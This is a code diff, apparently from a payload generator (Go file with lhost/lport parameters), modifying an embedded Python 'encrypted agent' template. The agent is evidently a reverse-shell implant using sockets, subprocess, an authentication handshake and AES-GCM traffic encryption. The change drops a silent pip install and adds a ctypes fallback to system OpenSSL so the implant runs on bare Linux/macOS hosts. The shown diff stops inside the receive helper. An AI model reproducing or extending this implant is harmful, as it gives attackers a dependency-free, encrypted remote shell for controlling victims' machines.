@@ -259,21 +259,54 @@ func Build(lhost, lport, webPort string) map[string][]Entry {
 }
 
 // agentTemplate is the encrypted Python agent source, with placeholders.
-const agentTemplate = `import socket,subprocess,sys,os,struct
-try:
-    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-except ImportError:
-    import subprocess as _sp
-    _sp.run([sys.executable,'-m','pip','install','cryptography','-q'],
-            stdout=_sp.DEVNULL,stderr=_sp.DEVNULL)
-    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+// Uses cryptography package if available, otherwise falls back to system
+// OpenSSL via ctypes — works on any Linux/macOS without pip.
+const agentTemplate = `import os,struct,socket,subprocess,sys,ctypes,ctypes.util
 KEY=bytes.fromhex('KEY_HEX')
 AUTH=b'HATURAYA_AUTH_v1'
 OK=b'HATURAYA_OK_v1'
+try:
+    from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _A
+    _enc=lambda k,n,d:_A(k).encrypt(n,d,None)
+    _dec=lambda k,n,d:_A(k).decrypt(n,d,None)
+except ImportError:
+    def _load():
+        for _n in ['libcrypto.so.3','libcrypto.so.1.1','libcrypto.so.10',
+                   'libcrypto.so','libcrypto.dylib',
+                   ctypes.util.find_library('crypto'),
+                   ctypes.util.find_library('ssl')]:
+            if not _n:continue
+            try:return ctypes.CDLL(_n)
+            except:pass
+        raise RuntimeError('OpenSSL not found')
+    _L=_load()
+    def _enc(key,nonce,pt):
+        ctx=_L.EVP_CIPHER_CTX_new()
+        _L.EVP_EncryptInit_ex(ctx,_L.EVP_aes_256_gcm(),None,None,None)
+        _L.EVP_CIPHER_CTX_ctrl(ctx,9,12,None)
+        _L.EVP_EncryptInit_ex(ctx,None,None,key,nonce)
+        b=ctypes.create_string_buffer(len(pt)+32);n=ctypes.c_int(0)
+        _L.EVP_EncryptUpdate(ctx,b,ctypes.byref(n),pt,len(pt));ct=b.raw[:n.value]
+        _L.EVP_EncryptFinal_ex(ctx,b,ctypes.byref(n));ct+=b.raw[:n.value]
+        t=ctypes.create_string_buffer(16)
+        _L.EVP_CIPHER_CTX_ctrl(ctx,16,16,t);_L.EVP_CIPHER_CTX_free(ctx)
+        return ct+t.raw
+    def _dec(key,nonce,ctag):
+        ct,tag=ctag[:-16],ctag[-16:]
+        ctx=_L.EVP_CIPHER_CTX_new()
+        _L.EVP_DecryptInit_ex(ctx,_L.EVP_aes_256_gcm(),None,None,None)
+        _L.EVP_CIPHER_CTX_ctrl(ctx,9,12,None)
+        _L.EVP_DecryptInit_ex(ctx,None,None,key,nonce)
+        b=ctypes.create_string_buffer(len(ct)+32);n=ctypes.c_int(0)
+        _L.EVP_DecryptUpdate(ctx,b,ctypes.byref(n),ct,len(ct));pt=b.raw[:n.value]
+        _L.EVP_CIPHER_CTX_ctrl(ctx,17,16,ctypes.c_char_p(tag))
+        _L.EVP_DecryptFinal_ex(ctx,b,ctypes.byref(n));pt+=b.raw[:n.value]
+        _L.EVP_CIPHER_CTX_free(ctx)
+        return pt
 def enc(d):
-    n=os.urandom(12);return n+AESGCM(KEY).encrypt(n,d,None)
+    n=os.urandom(12);return n+_enc(KEY,n,d)
 def dec(d):
-    return AESGCM(KEY).decrypt(d[:12],d[12:],None)
+    return _dec(KEY,d[:12],d[12:])
 def ra(s,n):
     d=b''
     while len(d)<n:d+=s.recv(n-len(d))
